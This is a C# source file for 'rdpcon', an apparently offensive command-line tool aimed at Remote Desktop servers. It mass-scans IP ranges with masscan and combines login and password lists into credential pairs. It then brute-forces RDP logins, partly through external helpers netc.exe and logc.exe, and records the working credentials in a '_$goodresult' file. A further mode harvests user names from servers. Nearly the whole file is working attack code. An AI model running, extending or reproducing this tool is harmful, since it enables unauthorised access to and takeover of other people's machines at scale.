using System;
using System.Collections.Generic;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Diagnostics;
using System.Web;
using System.Text;

namespace rdpcon
{
    class Program
    {
        public static List<string> ResultIP = new List<string>();
        //public static bool IsNext = false;
        [STAThread]
        static void Main(string[] args)
        {
            try
            {   
                Settings.Load();
                Console.ResetColor();
                if (args.Length == 0 || args[0] == "-help")
                {
                    Console.WriteLine(
                        "\n\t██████╗ ██████╗ ██████╗  █████╗  █████╗ ███╗  ██╗    ███╗      █████╗ \n" +
                        "\t██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗ ██║   ████║     ██╔══██╗\n" +
                        "\t██████╔╝██║  ██║██████╔╝██║  ╚═╝██║  ██║██╔██╗██║  ██╔██║     ██║  ██║\n" +
                        "\t██╔══██╗██║  ██║██╔═══╝ ██║  ██╗██║  ██║██║╚████║  ╚═╝██║     ██║  ██║\n" +
                        "\t██║  ██║██████╔╝██║     ╚█████╔╝╚█████╔╝██║ ╚███║  ███████╗██╗╚█████╔╝\n" +
                        "\t╚═╝  ╚═╝╚═════╝ ╚═╝      ╚════╝  ╚════╝ ╚═╝  ╚══╝  ╚══════╝╚═╝ ╚════╝ \n\n" +
                        "\t-check\t\tChecking server on RDP connection with port\n" +
                        "\t-scan\t\tCreate file with IP list processed with IP/CIDR\n" +
                        "\t-help\t\tHelp with commands\n" +
                        "\t-params\t\tHelp with command arguments\n" +
                        "\t-clear\t\tClear all files in Output with _$checkresult, _$scanresult, _$loginresult, _$hashresult, _$goodresult\n" +
                        "\t-hash\t\tCreate file with all kinds connect methods. Example:\n" +
                        "\t\tInput file with IP:PORT or IP [LOGIN;*;] and file with passwords\n" +
                        "\t\tOutput file with IP:PORT@LOGIN;PASSWORD\n" +
                        "\t-tclp\t\tTrying connection to server with login and password (not recommended to use, not changed port)\n" +
                        "\t-tch\t\tTrying connection to server with generated hash (not change port)\n" +
                        "\t-netc\t\tAnother method connection to server with generated hash (recomended, changed port)\n" +
                        "\t-logc\t\tGet login list from RDP server\n\n" +
                        "Press any key to exit...");
                    Console.ReadKey();
                }
                else if (args[0] == "-check")
                {
                    NeedCountArgs(args, 4, 4);
                    string file = FileForParseExist(args[1]);
                    string[] IPList = File.ReadAllLines(file);
                    NeedArg(args, 2, "-port");
                    int Port = InputInt(args[3]);
                    foreach (string IP in IPList)
                    {
                        if (!string.IsNullOrEmpty(IP))
                        {
                            Console.Write(IP);
                            if (IsRDPAvailiable(IP, Port))
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine("\t\tALLOWED");

                                AppenFile(string.Format("Output/{0}_$checkresult.txt", Path.GetFileNameWithoutExtension(file)), $"\n{IP}");
                                //ResultIP.Add(IP);
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.WriteLine("\t\tDENIED");
                            }
                            Console.ResetColor();
                        }
                    }
                    //File.WriteAllLines(string.Format("Output/{0}_checkresult.txt", Path.GetFileNameWithoutExtension(file)), ResultIP.ToArray());
                    Console.WriteLine("Checked IP with {0} writed in Output/{1}_$checkresult.txt", ResultIP.Count, Path.GetFileNameWithoutExtension(file));
                }
                else if (args[0] == "-params")
                {
                    NeedCountArgs(args, 1, 1);
                    Console.WriteLine("rdpcon\tCOM\tPARAMS\tTYPE\tINFO\n" +
                        "\t-check\t\tSTRING\tFile with ip list\n" +
                        "\t\t-port\tINT\tPort for checking\n" +
                        "\t-scan\t\tSTRING\tFile with IP/CIDR\n" +
                        "\t\tCONFIG:\t\trate\n" +
                        "\t\t-port\tPort for checking\n" +
                        "\t-hash\t\tSTRING\tFile with hosts and logins\n" +
                        "\t\t-p\tSTRING\tFile with passwords\n" +
                        "\t-tclp\t\tSTRING\tFile with ip list\n" +
                        "\t\t-l\tSTRING\tFile with logins\n" +
                        "\t\t-p\tSTRING\tFile with passwords\n" +
                        "\t\t-check\tBOOLEAN\tChecking server on RDP connection\n" +
                        "\t\tCONFIG:\t\ttime_out, login_wait\n" +
                        "\t-tch\t\tSTRING\tFile with hash\n" +
                        "\t\tCONFIG:\t\ttime_out, login_wait\n" +
                        "\t-netc\t\tSTRING\tFile with hash\n" +
                        "\t\t-nla\tBOOLEAN\tChecking server on NLA security\n" +
                        "\t\tCONFIG:\t\tnetc_time_out\n" + 
                        "\t-logc\t\tSTRING\tFile with hash\n" +
                        "\t\t-check\tBOOLEAN\tChecking server on RDP connection\n" +
                        "\t\tCONFIG:\t\twidth, height, time_out, delay\n" +
                        "\t-help\t\t\tNo args\n" +
                        "\t-params\t\t\tNo args\n" +
                        "\t-clear\t\t\tNo args");
                }
                else if(args[0] == "-clear")
                {
                    foreach(string Filename in Directory.GetFiles("Output"))
                    {
                        if(Filename.Contains("_$checkresult") || Filename.Contains("_$scanresult") || Filename.Contains("_$hashresult") ||
                            Filename.Contains("_$goodresult") || Filename.Contains("_$loginresult"))
                            File.Delete(Filename);
                    }

                }
                else if (args[0] == "-scan")
                {
                    NeedCountArgs(args, 4, 4);
                    string file = FileForParseExist(args[1]);
                    string[] IPCIDRList = File.ReadAllLines(file);
                    NeedArg(args, 2, "-port");
                    int Port = InputInt(args[3]);
                    int Rate = Settings.Config["scan_rate"].Item1.ToInt();
                    Console.WriteLine(string.Format("Was loaded {0} IP/CIDR list. Waiting...", IPCIDRList.Length));
                    ProcessStartInfo Masscan = new ProcessStartInfo("masscan.exe")
                    {
                        UseShellExecute = true,
                        Arguments = string.Format("-iL {0} -oL scan.temp --open --rate {1} --port {2} --wait 0", file, Rate, Port),
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    Process.Start(Masscan).WaitForExit();

                    string scantemp = FileForParseExist("scan.temp");
                    string[] ScanList = File.ReadAllLines(scantemp);
                    List<string> ScannedIP = new List<string>();
                    foreach (string IP in ScanList)
                    {
                        if (!string.IsNullOrEmpty(IP))
                        {
                            string[] Words = IP.Split(new char[] { ' ' });
                            if (Words.Length == 5)
                                ScannedIP.Add(Words[3]);
                        }
                    }

                    File.Delete("scan.temp");
                    File.WriteAllLines(string.Format("Output/{0}_$scanresult.txt", Path.GetFileNameWithoutExtension(file)), ScannedIP.ToArray());
                    Console.WriteLine(string.Format("Founded {0}. IP writed in Output/{1}_$scanresult.txt", ScannedIP.Count, Path.GetFileNameWithoutExtension(file)));
                }
                else if (args[0] == "-hash")
                {
                    NeedCountArgs(args, 4, 4);
                    string file = FileForParseExist(args[1]);
                    string[] IPLogList = File.ReadAllLines(file);
                    NeedArg(args, 2, "-p");
                    string[] PassList = File.ReadAllLines(FileForParseExist(args[3]));
                    Console.WriteLine("Process was running. Waiting...");
                    foreach (string IPLog in IPLogList)
                    {
                        if (!string.IsNullOrEmpty(IPLog))
                        {
                            string CurIP = IPLog.Split(new char[] { ' ' })[0].Trim();
                            string[] LogList = IPLog.TrimEnd(new char[] { ';' }).Split(new char[] { ' ' })[1].Split(new char[] { ';' });
                            foreach (string Log in LogList)
                                foreach (string Pass in PassList)
                                    AppenFile(string.Format("Output/{0}_$hashresult.txt", Path.GetFileNameWithoutExtension(file)),
                                        string.Format("\n{0}@{1};{2}", CurIP, Log.Trim(), Pass.Trim().Replace("%login%", Log.Trim())));
                                    //ResultIP.Add(string.Format("{0}@{1};{2}", CurIP, Log.Trim(), Pass.Trim().Replace("%login%", Log.Trim())));
                        }
                    }
                    //File.WriteAllLines(string.Format("Output/{0}_hashresult.txt", Path.GetFileNameWithoutExtension(file)), ResultIP.ToArray());
                    Console.WriteLine(string.Format("Process was ended with {0}. Result writed in Output/{1}_$hashresult.txt", ResultIP.Count, Path.GetFileNameWithoutExtension(file)));

                }
                else if (args[0] == "-tclp")
                {
                    NeedCountArgs(args, 6, 7);
                    string file = FileForParseExist(args[1]);
                    string[] IPList = File.ReadAllLines(FileForParseExist(file));
                    NeedArg(args, 2, "-l");
                    string[] LogList = File.ReadAllLines(FileForParseExist(args[3]));
                    NeedArg(args, 4, "-p");
                    string[] PassList = File.ReadAllLines(FileForParseExist(args[5]));
                    int TimeOut = Settings.Config["tc_time_out"].Item1.ToInt();
                    int LogWait = Settings.Config["tc_login_wait"].Item1.ToInt();
                    bool IsCheckIP = MaybeArg(args, 7, "-check");
                    List<string> HostList = new List<string>();
                    foreach (string IP in IPList)
                        if ((IsCheckIP ? IsRDPAvailiable(IP, 3389) : true) && !string.IsNullOrEmpty(IP))
                            foreach (string Log in LogList)
                                foreach (string Pass in PassList)
                                    HostList.Add(string.Format("{0}:3389@{1};{2}", IP.Trim(), Log.Trim(), Pass.Trim().Replace("%login%", Log.Trim())));
                    Console.WriteLine(string.Format("Was loaded {0} hosts. This operation may take serveral hours.", HostList.Count));
                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);
                    Application.Run(new RDPAPP(args[1], HostList.ToArray(), TimeOut, LogWait));
                    Console.WriteLine(string.Format("All good hosts added in Output/{0}_$goodresult.txt", Path.GetFileNameWithoutExtension(file)));
                }
                else if (args[0] == "-tch")
                {
                    NeedCountArgs(args, 2, 2);
                    string file = FileForParseExist(args[1]);
                    string[] HashList = File.ReadAllLines(file);
                    int TimeOut = Settings.Config["tc_time_out"].Item1.ToInt();
                    int LogWait = Settings.Config["tc_login_wait"].Item1.ToInt();
                    //NeedArg(args, 2, "-to");
                    //int TimeOut = InputInt(args[3]);
                    //NeedArg(args, 4, "-lw");
                    //int LogWait = InputInt(args[5]);

                    Console.WriteLine(string.Format("Was loaded {0} hosts. This operation may take serveral hours.", HashList.Length));
                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);
                    Application.Run(new RDPAPP(args[1], HashList, TimeOut, LogWait));
                    Console.WriteLine(string.Format("All good hosts added in Output/{0}_$goodresult.txt", Path.GetFileNameWithoutExtension(file)));
                }
                else if (args[0] == "-netc")
                {
                    NeedCountArgs(args, 2, 3);
                    string file = FileForParseExist(args[1]);
                    string[] HashList = File.ReadAllLines(file);
                    int TimeOut = Settings.Config["netc_time_out"].Item1.ToInt();
                    //NeedArg(args, 2, "-to");
                    //int TimeOut = InputInt(args[3]);
                    bool NLA = MaybeArg(args, 5, "-nla");
                    Console.WriteLine(string.Format("Was loaded {0} hosts. This operation may take serveral hours.", HashList.Length));
                    foreach (string Hash in HashList)
                    {
                        if (!string.IsNullOrEmpty(Hash))
                        {
                            string IP = Hash.Split(new char[] { ':' })[0].Trim();
                            int Port = Hash.Split(new char[] { ':' })[1].Split(new char[] { '@' })[0].Trim().ToInt();
                            string Log = Hash.Split(new char[] { '@' })[1].Split(new char[] { ';' })[0].Trim();
                            string Pass = Hash.Split(new char[] { '@' })[1].Split(new char[] { ';' })[1].Trim();
                            Console.Write(string.Format("{0}:{1}, {2} & {3}", IP, Port, Log, Pass));
                            int Result = CheckConnection(IP, Port, Log, Pass, NLA, TimeOut);
                            if (Result == 1)
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine("\tALLOWED");
                                AppenFile(string.Format("Output/{0}_$goodresult.txt", Path.GetFileNameWithoutExtension(file)),
                                    string.Format("\n{0}:{1}@{2};{3}", IP, Port, Log, Pass));
                                //ResultIP.Add(string.Format("{0}:{1}@{2};{3}", IP, Port, Log, Pass));
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.WriteLine("\tDENIED");
                            }
                            Console.ResetColor();
                        }
                    }
                    //File.WriteAllLines(string.Format("Output/{0}_goodresult.txt", Path.GetFileNameWithoutExtension(file)), ResultIP.ToArray());
                    Console.WriteLine(string.Format("All good hosts added in Output/{0}_$goodresult.txt", Path.GetFileNameWithoutExtension(file)));
                }
                else if (args[0] == "-logc")
                {
                    NeedCountArgs(args, 4, 5);
                    string file = FileForParseExist(args[1]);
                    string[] IPList = File.ReadAllLines(file);
                    NeedArg(args, 2, "-port");
                    int Port = InputInt(args[3]);
                    int TimeOut = Settings.Config["logc_time_out"].Item1.ToInt();
                    int Delay = Settings.Config["logc_delay"].Item1.ToInt();
                    int Width = Settings.Config["logc_width"].Item1.ToInt();
                    int Height = Settings.Config["logc_height"].Item1.ToInt();
                    //NeedArg(args, 4, "-to");
                    //int TimeOut = InputInt(args[5]);
                    bool IsCheckIP = MaybeArg(args, 5, "-check");
                    Console.WriteLine(string.Format("Was loaded {0} hosts. This operation may take serveral hours.", IPList.Length));
                    foreach (string IP in IPList)
                    {
                        if ((IsCheckIP ? IsRDPAvailiable(IP, Port) : true) && !string.IsNullOrEmpty(IP))
                        {
                            Console.Write(IP);
                            string Result = GetUsers(IP, Port, Width, Height, Delay, TimeOut);
                            if (!string.IsNullOrEmpty(Result))
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine($"\tALLOWED <= {Result}");
                                AppenFile(string.Format("Output/{0}_$loginresult.txt", Path.GetFileNameWithoutExtension(file)),
                                    string.Format("\n{0}:{1} {2}", IP, Port, Result));
                                //ResultIP.Add(string.Format("{0}:{1} {2}", IP, Port, Result));
                            }
                            else {
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.WriteLine("\tDENIED => X");
                            }
                            Console.ResetColor();
                        }
                    }
                    //File.WriteAllLines(string.Format("Output/{0}_loginresult.txt", Path.GetFileNameWithoutExtension(file)), ResultIP.ToArray());
                    Console.WriteLine(string.Format("All good hosts added in Output/{0}_$loginresult.txt", Path.GetFileNameWithoutExtension(file)));
                }
                else
                    throw new ArgumentException("param *. Command not found. Use -help or -params");
            }
            catch(ArgumentException e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(e.Message);
                Console.ResetColor();
            }
            catch(Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Critical error. The file rdpapp.config may be damaged or not found.\nFull error: " + e.Message);
                Console.ResetColor();
            }
        }

        public static bool IsRDPAvailiable(string IP, int Port)  { try { using (new TcpClient(IP, Port) ) return true; } catch { return false; } }
        public static void NeedCountArgs(string[] args, int need, int can_need)
        {
            if (args.Length != need && args.Length != can_need)
                throw new ArgumentException("param *. Not enough arguments");
        }

        public static void NeedArg(string[] args, int need, string arg)
        {
            if (args.Length >= need && args[need-1] == arg)
                throw new ArgumentException(string.Format("param {0}. Argument not found. Use -params", arg));
        }

        public static string FileForParseExist(string file)
        {
            if (!File.Exists(file))
                throw new ArgumentException(string.Format("param {0}. File for parse not found", file));
            return file;
        }

        public static int InputInt(string String)
        {
            try{ return int.Parse(String); }
            catch { throw new ArgumentException(string.Format("param {0}. Can't convert string to int", String)); }
        }

        public static bool MaybeArg(string[] args, int need, string arg)
        {
            if (args.Length < need)
                return false;
            else if (args.Length >= need && args[need - 1] == arg)
                return true;
            else
                throw new ArgumentException(string.Format("param {0}. Argument not found. Use -params", arg));
        }

        public static void AppenFile(string Filename, string Text)
        {
            bool IsClear = false;
            if (File.Exists(Filename) && string.IsNullOrEmpty(File.ReadAllText(Filename)))
                IsClear = true;

            if (IsClear)
                File.WriteAllText(Filename, Text);
            else
                File.AppendAllText(Filename, Text);
        }

        public static int CheckConnection(string Host, int Port, string Log, string Pass, bool NLA, int Timeout)
        {
            int Result = 3;
            string Arguments = string.Format("-host {0} -p {1} -l {2} -pwd {3} -nla {4}", new object[] {
                Host,
                Port,
                HttpUtility.UrlEncode(Log),
                HttpUtility.UrlEncode(Pass),
                NLA
            });

            ProcessStartInfo CSRS = new ProcessStartInfo("netc.exe", Arguments)
            {
                CreateNoWindow = false,
                UseShellExecute = false,
                RedirectStandardOutput= true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            using (Process CSRSProc = Process.Start(CSRS))
            {
                CSRSProc.WaitForExit(Timeout * 1000);
                if (!CSRSProc.HasExited)
                    CSRSProc.Kill();
                else
                    Result = CSRSProc.ExitCode;
            }

            return Result;
        }

        public static string GetUsers(string Host, int Port, int Width, int Height, int Delay, int Timeout)
        {
            string Users = string.Empty;
            try
            {
                using (MemoryMappedFile  MMF = MemoryMappedFile.CreateOrOpen(Host, 1024L))
                {
                    using (MemoryMappedViewAccessor MMVA = MMF.CreateViewAccessor())
                    {
                        try
                        {
                            string Arguments = string.Format("-host {0} -w {1} -h {2} -s {3} -p {4} -lang auto", new object[] {
                                Host,
                                Width,
                                Height,
                                Delay * 1000,
                                Port
                            });

                            ProcessStartInfo CSRS = new ProcessStartInfo("logc.exe", Arguments)
                            {
                                CreateNoWindow = false,
                                WindowStyle = ProcessWindowStyle.Hidden,
                                UseShellExecute = false,
                                RedirectStandardOutput = true
                            };

                            using (Process CSRSProc = Process.Start(CSRS))
                            {
                                CSRSProc.WaitForExit(Timeout * 1000);
                                if (!CSRSProc.HasExited)
                                    CSRSProc.Kill();
                            }

                            try
                            {
                                MMVA.ReadByte(0L);
                                ushort Number = MMVA.ReadUInt16(1L);
                                if (Number > 0)
                                {
                                    byte[] Buffer = new byte[(int)Number];
                                    MMVA.ReadArray<byte>(3L, Buffer, 0, (int)Number);
                                    Users = Encoding.UTF8.GetString(Buffer);
                                }
                                string.IsNullOrEmpty(Users);
                            }
                            catch { }
                        }
                        catch{ }
                    }
                }
            }
            catch { Users = string.Empty; }
            return Users;
        }
    }
}
